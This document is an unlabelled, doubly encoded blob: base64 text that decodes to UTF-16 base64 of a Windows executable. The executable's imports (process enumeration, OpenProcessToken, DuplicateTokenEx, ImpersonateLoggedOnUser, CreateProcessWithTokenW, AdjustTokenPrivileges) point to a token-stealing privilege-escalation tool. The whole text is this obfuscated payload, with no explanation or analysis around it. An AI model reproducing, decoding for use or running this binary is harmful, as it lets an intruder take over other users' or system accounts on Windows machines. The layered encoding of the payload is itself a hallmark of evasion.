AGcARwBBAEEAQQB1AGMAbQBSAGgAZABHAEUAQQBBAEkAZwA1AEEAQQBEADAAQQBRAEEAQQBMAG4ASgBrAFkAWABSAGgASgBIAEkAQQBBAEEAQQBBAGYARABzAEEAQQBCAHcARABBAEEAQQB1AGMAbQBSAGgAZABHAEUAawBlAG4AcAA2AFoARwBKAG4AQQBBAEEAQQBtAEQANABBAEEAQQBnAEEAQQBBAEEAdQBjAG4AUgBqAEoARQBsAEIAUQBRAEEAQQBBAEEAQwBnAFAAZwBBAEEAQwBBAEEAQQBBAEMANQB5AGQARwBNAGsAUwBWAHAAYQBBAEEAQQBBAEEASwBnACsAQQBBAEEASQBBAEEAQQBBAEwAbgBKADAAWQB5AFIAVQBRAFUARQBBAEEAQQBBAEEAcwBEADQAQQBBAEEAZwBBAEEAQQBBAHUAYwBuAFIAagBKAEYAUgBhAFcAZwBBAEEAQQBBAEMANABQAGcAQQBBAFMAQQBJAEEAQQBDADUANABaAEcARgAwAFkAUQBBAEEAQQBFAEUAQQBBAE8AdwBBAEEAQQBBAHUAZQBHAFIAaABkAEcARQBrAGUAQQBBAEEAQQBBAEQAcwBRAFEAQQBBAHQAQQBBAEEAQQBDADUAcABaAEcARgAwAFkAUwBRAHkAQQBBAEEAQQBBAEsAQgBDAEEAQQBBAFkAQQBBAEEAQQBMAG0AbABrAFkAWABSAGgASgBEAE0AQQBBAEEAQQBBAHUARQBJAEEAQQBHAEEAQwBBAEEAQQB1AGEAVwBSAGgAZABHAEUAawBOAEEAQQBBAEEAQQBBAFkAUgBRAEEAQQBMAGcAWQBBAEEAQwA1AHAAWgBHAEYAMABZAFMAUQAyAEEAQQBBAEEAQQBBAEIAUQBBAEEAQQA0AEEAQQBBAEEATABtAFIAaABkAEcARQBBAEEAQQBBADQAVQBBAEEAQQBxAEEAQQBBAEEAQwA1AGsAWQBYAFIAaABKAEgASQBBADQARgBBAEEAQQBQAGcARgBBAEEAQQB1AFkAbgBOAHoAQQBBAEEAQQBBAEEAQgBnAEEAQQBCADgAQQBnAEEAQQBMAG4AQgBrAFkAWABSAGgAQQBBAEEAQQBjAEEAQQBBAFkAQQBBAEEAQQBDADUAeQBjADMASgBqAEoARABBAHgAQQBBAEEAQQBBAEcAQgB3AEEAQQBDAEEAQQBRAEEAQQBMAG4ASgB6AGMAbQBNAGsATQBEAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUgBzAEUAQQBCAHQAUwBGADMAQQBXAFkAQgBVAHcARwBUAFUATABBAEMATgBVAFcAQQBBAGYATgBGAGMAQQBFAGcARgBRAEEAQQB2AHcAQwBlAEEASAB3AEEAVgB3AEIARwBBAEEAQQBBAFEAdABBAEEARABRAE4AdwBBAEEAYwBnAEkAQQBBAFAALwAvAC8ALwArAHcATABRAEEAQQBBAEEAQQBBAEEATAB3AHQAQQBBAEEAQQBBAEEAQQBBACsAaABBAEEAQQBQAC8ALwAvAC8AOQBjAEUAUQBBAEEAQQBBAEEAQQBBAEIAbwBTAEEAQQBBAEIAQQBBAEEAQQBnAFIASQBBAEEAUAAvAC8ALwAvADgAWgBIAHcAVQBBAEQAVABSAFEAQQBBADAAQgBUAGcAQQBHAGMAQQBBAEEAaQBDAHcAQQBBAEcAQQBDAEEAQQBBAFoATQBnAGsAQQBKAEgAUQB1AEEAQwBCAGsATABRAEEAYwBOAEMAdwBBAEQAdwBFAHEAQQBBAFIAUQBBAEEAQQBFAEwAUQBBAEEAcQBEAGMAQQBBAEUASQBCAEEAQQBEAC8ALwAvAC8ALwAwAEMAMABBAEEAQQBBAEEAQQBBAEMASABGAEEAQQBBAC8ALwAvAC8ALwB3ADQAVgBBAEEAQQBBAEEAQQBBAEEAYgBCAGcAQQBBAFAALwAvAC8ALwA4AEIAQgBnAEkAQQBCAGoASQBDAE0AQQBFAFAAQwBBAEEAUABNAGcAdgB3AEMAZQBBAEgAdwBBAFYAdwBCAEcAQQBEAFUAQQBJAHcAQQBRAG8ARgBBAEEAcABDAEIAcwBBAEUAWQBBAE4AUQBBAGoAQQBBAEEAQwBGAEYAQgBnAEIARgBkAEEAcwBBAEQAdgBRAEUAQQBBAFgAawBEAEEARABBAEcAZwBBAEEANwB4AG8AQQBBAEoAdwAvAEEAQQBBAGgAQQBBAEEAQQB3AEIAbwBBAEEATwA4AGEAQQBBAEMAYwBQAHcAQQBBAEEAUQBRAEIAQQBBAFIAQwBBAEEAQQBCAEMAUQBRAEEAQwBWAEkARgA0AEEATgBnAEEAagBBAGgAUgBRAFkAQQBSAFgAUQBGAEEAQQA3ADAAQgBBAEEARgBWAEEAdwBBAFEAQgB3AEEAQQBHAGsAYwBBAEEARABnAFAAdwBBAEEASQBRAEEAQQBBAEUAQQBjAEEAQQBCAHAASABBAEEAQQA0AEQAOABBAEEAQQBFAEEAQQBBAEEASgBEAHcAWQBBAEQAMgBRAEoAQQBBADgAMABDAEEAQQBQAFUAZwB0AHcAeABpAHMAQQBBAEEASQBBAEEAQQBCADEASAB3AEEAQQBlAGkAQQBBAEEATgB3AHQAQQBBAEIANgBJAEEAQQBBAHIAaQBBAEEAQQBNAEEAZwBBAEEARABjAEwAUQBBAEEAZQBpAEEAQQBBAEEARQBHAEEAZwBBAEcATQBnAEoAUQBBAFEAawBCAEEAQQBsAGkAQQBBAEEAQgBDAEEAUQBBAEMASABJAEUAYwBBAE4AZwBBAGoAQQBCAEMAZwBRAEEAQwBqAFEARwBBAEEAbwB5AEIAbgBBAEIAQgBBAEUAQQBCAEkASQBBAEEAQQBrAEUAQQBRAEEARQBJAGcAQQBBAHgAaQBzAEEAQQBBAEUAQQBBAEEAQQAzAEoAUQBBAEEAdwBTAFUAQQBBAFAAbwB0AEEAQQBEAEIASgBRAEEAQQBBAFEASQBCAEEAQQBKAFEAQQBBAEEAQgBEAFEAUQBBAEQAVABRAEoAQQBBADAAeQBCAGwAQQBCAEYAUQBVAEEARgBUAFMANgBBAEIAVQBCAHUAQQBBAEcAVQBBAEEAQQBBAFEAOABHAEEAQQA5AGsAQgBnAEEAUABOAEEAVQBBAEQAeABJAEwAYwBBAEUAQQBBAEEAQQBCAEEAZwBFAEEAQQBqAEEAQQBBAEEARQBaAEMAZwBBAFoAZABBAGsAQQBHAFcAUQBJAEEAQgBsAFUAQgB3AEEAWgBOAEEAWQBBAEcAVABJAFYANABBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUgBDAE0AQQBBAEEAQQBBAEEAQQBBAGcAUQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEkAQQBBAEEAQQA0AFEAUQBBAEEAWQBFAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBBAEEAQQBBAEEANABVAEEAQQBBAEEAQQBBAEEAQQBQAC8ALwAvAC8AOABBAEEAQQBBAEEARwBBAEEAQQBBAEYAZwBpAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFkARgBBAEEAQQBBAEEAQQBBAEEARAAvAC8ALwAvAC8AQQBBAEEAQQBBAEIAZwBBAEEAQQBBAFEASQB3AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAFEAagBBAEEAQQBBAEEAQQBBAEEAcQBFAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARABBAEEAQQBBAHkARQBFAEEAQQBEAGgAQgBBAEEAQgBnAFEAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEMASQBVAEEAQQBBAEEAQQBBAEEAQQBQAC8ALwAvAC8AOABBAEEAQQBBAEEARwBBAEEAQQBBAEwAUQBpAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAEQAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBKAGgARgBBAEEAQgBJAE0AQQBBAEEAdQBFAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBVAGsAWQBBAEEAQQBBAHcAQQBBAEMAdwBRAHcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQwBDAFIAZwBBAEEAKwBEAEEAQQBBAE0AQgBEAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBCAEgAQQBBAEEASQBNAFEAQQBBADgARQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUgBFAGsAQQBBAEQAZwB5AEEAQQBCAFEAUgBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAawBTAFEAQQBBAG0ARABFAEEAQQBBAGgARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEkAWgBKAEEAQQBCAFEATQBRAEEAQQBRAEUAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAHAAawBrAEEAQQBJAGcAeABBAEEAQQB3AFIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBEAEcAUwBRAEEAQQBlAEQARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEQAcABHAEEAQQBBAEEAQQBBAEEAQQBJAGsAWQBBAEEAQQBBAEEAQQBBAEEAUwBSAGcAQQBBAEEAQQBBAEEAQQBQAGgARgBBAEEAQQBBAEEAQQBBAEEAMwBrAFUAQQBBAEEAQQBBAEEAQQBEAEsAUgBRAEEAQQBBAEEAQQBBAEEATABwAEYAQQBBAEEAQQBBAEEAQQBBAHAAawBVAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEkAcABGAEEAQQBBAEEAQQBBAEEAQQBlAEUAVQBBAEEAQQBBAEEAQQBBAEIAbQBSAFEAQQBBAEEAQQBBAEEAQQBGAFoARgBBAEEAQQBBAEEAQQBBAEEATwBrAFUAQQBBAEEAQQBBAEEAQQBBAHMAUgBRAEEAQQBBAEEAQQBBAEEAQgBoAEYAQQBBAEEAQQBBAEEAQQBBAC8ARQBrAEEAQQBBAEEAQQBBAEEAQQBXAFMAZwBBAEEAQQBBAEEAQQBBAEMAcABLAEEAQQBBAEEAQQBBAEEAQQBSAGsAbwBBAEEAQQBBAEEAQQBBAEIAawBTAGcAQQBBAEEAQQBBAEEAQQBIAGgASwBBAEEAQQBBAEEAQQBBAEEANgBFAGsAQQBBAEEAQQBBAEEAQQBDAFUAUwBnAEEAQQBBAEEAQQBBAEEASwA1AEsAQQBBAEEAQQBBAEEAQQBBAHgARQBvAEEAQQBBAEEAQQBBAEEARABhAFMAZwBBAEEAQQBBAEEAQQBBAFAAUgBLAEEAQQBBAEEAQQBBAEEAQQBIAGsAcwBBAEEAQQBBAEEAQQBBAEEASwBTAHcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAWQBFAFkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATgBaAEcAQQBBAEEAQQBBAEEAQQBBAEIAawBjAEEAQQBBAEEAQQBBAEEAQwBRAFIAZwBBAEEAQQBBAEEAQQBBAFAAQgBHAEEAQQBBAEEAQQBBAEEAQQBwAGsAWQBBAEEAQQBBAEEAQQBBAEEAOABTAHcAQQBBAEEAQQBBAEEAQQBEAEoATABBAEEAQQBBAEEAQQBBAEEAdgBrAFkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEASQBCAEgAQQBBAEEAQQBBAEEAQQBBAGQARQBjAEEAQQBBAEEAQQBBAEEARABLAFMAQQBBAEEAQQBBAEEAQQBBAE8AcABJAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEMAMABTAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAcgBFAGMAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUABKAEkAQQBBAEEAQQBBAEEAQQBBAEQAawBrAEEAQQBBAEEAQQBBAEEAQQBxAFMAUQBBAEEAQQBBAEEAQQBBAEQAaABKAEEAQQBBAEEAQQBBAEEAQQBUAGsAYwBBAEEAQQBBAEEAQQBBAEMARwBTAEEAQQBBAEEAQQBBAEEAQQBIAHgASQBBAEEAQQBBAEEAQQBBAEEAVgBrAGcAQQBBAEEAQQBBAEEAQQBCAHkAUwBBAEEAQQBBAEEAQQBBAEEARwBSAEkAQQBBAEEAQQBBAEEAQQBBAFEARQBnAEEAQQBBAEEAQQBBAEEAQQBxAFMAQQBBAEEAQQBBAEEAQQBBAEIANQBJAEEAQQBBAEEAQQBBAEEAQQAvAEUAYwBBAEEAQQBBAEEAQQBBAEQAYQBSAHcAQQBBAEEAQQBBAEEAQQBNAEIASABBAEEAQQBBAEEAQQBBAEEAbgBFAGMAQQBBAEEAQQBBAEEAQQBDAEsAUgB3AEEAQQBBAEEAQQBBAEEARABoAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAwAFIAdwBBAEEAQQBBAEEAQQBBAEMASgBIAEEAQQBBAEEAQQBBAEEAQQAyAGsAZwBBAEEAQQBBAEEAQQBBAEIASQBTAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEASABRAEoASABaAFgAUgBEAGQAWABKAHkAWgBXADUAMABVAEgASgB2AFkAMgBWAHoAYwB3AEEAUQBCAEUAOQB3AFoAVwA1AFEAYwBtADkAagBaAFgATgB6AEEAUABzAEEAUQAzAEoAbABZAFgAUgBsAFYARwA5AHYAYgBHAGgAbABiAEgAQQB6AE0AbABOAHUAWQBYAEIAegBhAEcAOQAwAEEAQQBCAG4AQQBrAGQAbABkAEUAeABoAGMAMwBSAEYAYwBuAEoAdgBjAGcAQQBBAE0AUQBSAFEAYwBtADkAagBaAFgATgB6AE0AegBKAE8AWgBYAGgAMABWAHcAQQBBAEwAdwBSAFEAYwBtADkAagBaAFgATgB6AE0AegBKAEcAYQBYAEoAegBkAEYAYwBBAGgAZwBCAEQAYgBHADkAegBaAFUAaABoAGIAbQBSAHMAWgBRAEIATABSAFYASgBPAFIAVQB3AHoATQBpADUAawBiAEcAdwBBAEEAUABFAEEAUgBIAFYAdwBiAEcAbABqAFkAWABSAGwAVgBHADkAcgBaAFcANQBGAGUAQQBBAEEAZQB3AEYASABaAFgAUgBWAGMAMgBWAHkAVABtAEYAdABaAFYAYwBBAEEAQgBVAEMAVAAzAEIAbABiAGwAQgB5AGIAMgBOAGwAYwAzAE4AVQBiADIAdABsAGIAZwBBAEEAaQB3AEYASgBiAFgAQgBsAGMAbgBOAHYAYgBtAEYAMABaAFUAeAB2AFoAMgBkAGwAWgBFADkAdQBWAFgATgBsAGMAZwBDAE4AQQBFAE4AeQBaAFcARgAwAFoAVgBCAHkAYgAyAE4AbABjADMATgBYAGEAWABSAG8AVgBHADkAcgBaAFcANQBYAEEATQBFAEMAVQBtAFYAMgBaAFgASgAwAFYARwA5AFQAWgBXAHgAbQBBAEEAQQBmAEEARQBGAGsAYQBuAFYAegBkAEYAUgB2AGEAMgBWAHUAVQBIAEoAcABkAG0AbABzAFoAVwBkAGwAYwB3AEMAdgBBAFUAeAB2AGIAMgB0ADEAYwBGAEIAeQBhAFgAWgBwAGIARwBWAG4AWgBWAFoAaABiAEgAVgBsAFYAdwBCAEIAUgBGAFoAQgBVAEUAawB6AE0AaQA1AGsAYgBHAHcAQQBBAEkANABDAFAAMQA5AFkAYgBHAFYAdQBaADMAUgBvAFgAMgBWAHkAYwBtADkAeQBRAEgATgAwAFoARQBCAEEAVwBVAEYAWQBVAEUAVgBDAFIARQBCAGEAQQBBAEIATgBVADEAWgBEAFUARABFADAATQBDADUAawBiAEcAdwBBAEEAQQA0AEEAWAAxADkARABlAEgAaABHAGMAbQBGAHQAWgBVAGgAaABiAG0AUgBzAFoAWABJAHoAQQBBAEEASQBBAEYAOQBmAFEAMQA5AHoAYwBHAFYAagBhAFcAWgBwAFkAMQA5AG8AWQBXADUAawBiAEcAVgB5AEEAQQBBAGgAQQBGADkAZgBjADMAUgBrAFgAMgBWADQAWQAyAFYAdwBkAEcAbAB2AGIAbAA5AGoAYgAzAEIANQBBAEEAQQBpAEEARgA5AGYAYwAzAFIAawBYADIAVgA0AFkAMgBWAHcAZABHAGwAdgBiAGwAOQBrAFoAWABOADAAYwBtADkANQBBAEEARQBBAFgAMABOADQAZQBGAFIAbwBjAG0AOQAzAFIAWABoAGoAWgBYAEIAMABhAFcAOQB1AEEAQQBBACsAQQBHADEAbABiAFgATgBsAGQAQQBBAEEAVgBrAE4AUwBWAFUANQBVAFMAVQAxAEYATQBUAFEAdwBMAG0AUgBzAGIAQQBBAEEAQQBBAEIAZgBYADIARgBqAGMAbgBSAGYAYQBXADkAaQBYADIAWgAxAGIAbQBNAEEAQQB3AEIAZgBYADMATgAwAFoARwBsAHYAWAAyAE4AdgBiAFcAMQB2AGIAbAA5ADIAWgBuAEIAeQBhAFcANQAwAFoAZwBBADUAQQBGADkAcABiAG4AWgBoAGIARwBsAGsAWAAzAEIAaABjAG0ARgB0AFoAWABSAGwAYwBsADkAdQBiADIAbAB1AFoAbQA5AGYAYgBtADkAeQBaAFgAUgAxAGMAbQA0AEEAQQBBAGcAQQBYADIATgBoAGIARwB4AHUAWgBYAGQAbwBBAEIAawBBAGIAVwBGAHMAYgBHADkAagBBAEEAQgBBAEEARgA5AHoAWgBXAGgAZgBaAG0AbABzAGQARwBWAHkAWAAyAFYANABaAFEAQgBDAEEARgA5AHoAWgBYAFIAZgBZAFgAQgB3AFgAMwBSADUAYwBHAFUAQQBDAFEAQgBmAFgAMwBOAGwAZABIAFYAegBaAFgASgB0AFkAWABSAG8AWgBYAEoAeQBBAEEAQQBZAEEARgA5AGoAYgAyADUAbQBhAFcAZAAxAGMAbQBWAGYAYgBtAEYAeQBjAG0AOQAzAFgAMgBGAHkAWgAzAFkAQQBBAEQATQBBAFgAMgBsAHUAYQBYAFIAcABZAFcAeABwAGUAbQBWAGYAYgBtAEYAeQBjAG0AOQAzAFgAMgBWAHUAZABtAGwAeQBiADIANQB0AFoAVwA1ADAAQQBBAEEAbwBBAEYAOQBuAFoAWABSAGYAYQBXADUAcABkAEcAbABoAGIARgA5AHUAWQBYAEoAeQBiADMAZABmAFoAVwA1ADIAYQBYAEoAdgBiAG0AMQBsAGIAbgBRAEEATgBnAEIAZgBhAFcANQBwAGQASABSAGwAYwBtADAAQQBOAHcAQgBmAGEAVwA1AHAAZABIAFIAbABjAG0AMQBmAFoAUQBCAFYAQQBHAFYANABhAFgAUQBBAEEAQwBNAEEAWAAyAFYANABhAFgAUQBBAFYAQQBCAGYAYwAyAFYAMABYADIAWgB0AGIAMgBSAGwAQQBBAEEARQBBAEYAOQBmAGMARgA5AGYAWAAyAEYAeQBaADIATQBBAEEAQQBVAEEAWAAxADkAdwBYADEAOQBmAFkAWABKAG4AZABnAEEAQQBGAGcAQgBmAFkAMgBWADQAYQBYAFEAQQBBAEIAVQBBAFgAMgBOAGYAWgBYAGgAcABkAEEAQQA5AEEARgA5AHkAWgBXAGQAcABjADMAUgBsAGMAbAA5ADAAYQBIAEoAbABZAFcAUgBmAGIARwA5AGoAWQBXAHgAZgBaAFgAaABsAFgAMgBGADAAWgBYAGgAcABkAEYAOQBqAFkAVwB4AHMAWQBtAEYAagBhAHcAQQBBAEMAQQBCAGYAWQAyADkAdQBaAG0AbABuAGQARwBoAHkAWgBXAEYAawBiAEcAOQBqAFkAVwB4AGwAQQBCAFkAQQBYADMATgBsAGQARgA5AHUAWgBYAGQAZgBiAFcAOQBrAFoAUQBBAEIAQQBGADkAZgBjAEYAOQBmAFkAMgA5AHQAYgBXADkAawBaAFEAQQBBAEcAQQBCAG0AYwBtAFYAbABBAEEAQQAwAEEARgA5AHAAYgBtAGwAMABhAFcARgBzAGEAWABwAGwAWAAyADkAdQBaAFgAaABwAGQARgA5ADAAWQBXAEoAcwBaAFEAQQBBAFAAQQBCAGYAYwBtAFYAbgBhAFgATgAwAFoAWABKAGYAYgAyADUAbABlAEcAbAAwAFgAMgBaADEAYgBtAE4AMABhAFcAOQB1AEEAQgA0AEEAWAAyAE4AeQBkAEYAOQBoAGQARwBWADQAYQBYAFEAQQBaAHcAQgAwAFoAWABKAHQAYQBXADUAaABkAEcAVQBBAFkAWABCAHAATABXADEAegBMAFgAZABwAGIAaQAxAGoAYwBuAFEAdABjADMAUgBrAGEAVwA4AHQAYgBEAEUAdABNAFMAMAB3AEwAbQBSAHMAYgBBAEIAaABjAEcAawB0AGIAWABNAHQAZAAyAGwAdQBMAFcATgB5AGQAQwAxAHkAZABXADUAMABhAFcAMQBsAEwAVwB3AHgATABUAEUAdABNAEMANQBrAGIARwB3AEEAWQBYAEIAcABMAFcAMQB6AEwAWABkAHAAYgBpADEAagBjAG4AUQB0AGEARwBWAGgAYwBDADEAcwBNAFMAMAB4AEwAVABBAHUAWgBHAHgAcwBBAEEAQgBoAGMARwBrAHQAYgBYAE0AdABkADIAbAB1AEwAVwBOAHkAZABDADEAdABZAFgAUgBvAEwAVwB3AHgATABUAEUAdABNAEMANQBrAGIARwB3AEEAQQBHAEYAdwBhAFMAMQB0AGMAeQAxADMAYQBXADQAdABZADMASgAwAEwAVwB4AHYAWQAyAEYAcwBaAFMAMQBzAE0AUwAwAHgATABUAEEAdQBaAEcAeABzAEEAQQBEAFQAQgBGAEoAMABiAEUATgBoAGMASABSADEAYwBtAFYARABiADIANQAwAFoAWABoADAAQQBOAG8ARQBVAG4AUgBzAFQARwA5AHYAYQAzAFYAdwBSAG4AVgB1AFkAMwBSAHAAYgAyADUARgBiAG4AUgB5AGUAUQBBAEEANABRAFIAUwBkAEcAeABXAGEAWABKADAAZABXAEYAcwBWAFcANQAzAGEAVwA1AGsAQQBBAEMAOABCAFYAVgB1AGEARwBGAHUAWgBHAHgAbABaAEUAVgA0AFkAMgBWAHcAZABHAGwAdgBiAGsAWgBwAGIASABSAGwAYwBnAEEAQQBlAHcAVgBUAFoAWABSAFYAYgBtAGgAaABiAG0AUgBzAFoAVwBSAEYAZQBHAE4AbABjAEgAUgBwAGIAMgA1AEcAYQBXAHgAMABaAFgASQBBAG0AZwBWAFUAWgBYAEoAdABhAFcANQBoAGQARwBWAFEAYwBtADkAagBaAFgATgB6AEEAQQBDAEoAQQAwAGwAegBVAEgASgB2AFkAMgBWAHoAYwAyADkAeQBSAG0AVgBoAGQASABWAHkAWgBWAEIAeQBaAFgATgBsAGIAbgBRAEEAVQBBAFIAUgBkAFcAVgB5AGUAVgBCAGwAYwBtAFoAdgBjAG0AMQBoAGIAbQBOAGwAUQAyADkAMQBiAG4AUgBsAGMAZwBBAGUAQQBrAGQAbABkAEUATgAxAGMAbgBKAGwAYgBuAFIAUQBjAG0AOQBqAFoAWABOAHoAUwBXAFEAQQBJAGcASgBIAFoAWABSAEQAZABYAEoAeQBaAFcANQAwAFYARwBoAHkAWgBXAEYAawBTAFcAUQBBAEEAUABBAEMAUgAyAFYAMABVADMAbAB6AGQARwBWAHQAVgBHAGwAdABaAFUARgB6AFIAbQBsAHMAWgBWAFIAcABiAFcAVQBBAGIAQQBOAEoAYgBtAGwAMABhAFcARgBzAGEAWABwAGwAVQAwAHgAcABjADMAUgBJAFoAVwBGAGsAQQBJAEkARABTAFgATgBFAFoAVwBKADEAWgAyAGQAbABjAGwAQgB5AFoAWABOAGwAYgBuAFEAQQBmAGcASgBIAFoAWABSAE4AYgAyAFIAMQBiAEcAVgBJAFkAVwA1AGsAYgBHAFYAWABBAEEAQQA4AEEARwAxAGwAYgBXAE4AdwBlAFEAQQBBAFAAUQBCAHQAWgBXADEAdABiADMAWgBsAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAE0AMQBkAEkATgBKAG0AMQBQAC8ALwBNAHEATABmAEwAWgBrAHIAQQBBAEQALwAvAC8ALwAvAEEAUQBBAEEAQQBBAEUAQQBBAEEAQQBDAEEAQQBBAEEATAB5AEEAQQBBAEEAQQBBAEEAQQBBAEEAKwBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAGMARABNAEEAUQBBAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEMANAAvAFEAVgBaAGkAWQBXAFIAZgBZAFcAeABzAGIAMgBOAEEAYwAzAFIAawBRAEUAQQBBAEEAQQBBAEEAQQBIAEEAegBBAEUAQQBCAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAHUAUAAwAEYAVwBaAFgAaABqAFoAWABCADAAYQBXADkAdQBRAEgATgAwAFoARQBCAEEAQQBBAEEAQQBBAEEAQgB3AE0AdwBCAEEAQQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBMAGoAOQBCAFYAbQBKAGgAWgBGADkAaABjAG4ASgBoAGUAVgA5AHUAWgBYAGQAZgBiAEcAVgB1AFoAMwBSAG8AUQBIAE4AMABaAEUAQgBBAEEAQQBCAHcATQB3AEIAQQBBAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEwAagA5AEIAVgBuAFIANQBjAEcAVgBmAGEAVwA1AG0AYgAwAEIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEIAQQBBAEEARwBVAFEAQQBBAEMANABQAGcAQQBBAGMAQgBBAEEAQQBLAEkAUwBBAEEARABFAFAAZwBBAEEAcwBCAEkAQQBBAEUAZwBVAEEAQQBBAGcAUAB3AEEAQQBVAEIAUQBBAEEATgBjAFkAQQBBAEEANABQAHcAQQBBADQAQgBnAEEAQQBFAEkAWgBBAEEAQwBBAFAAdwBBAEEAVQBCAGsAQQBBAEwAcwBhAEEAQQBDAEkAUAB3AEEAQQB3AEIAbwBBAEEATwA4AGEAQQBBAEMAYwBQAHcAQ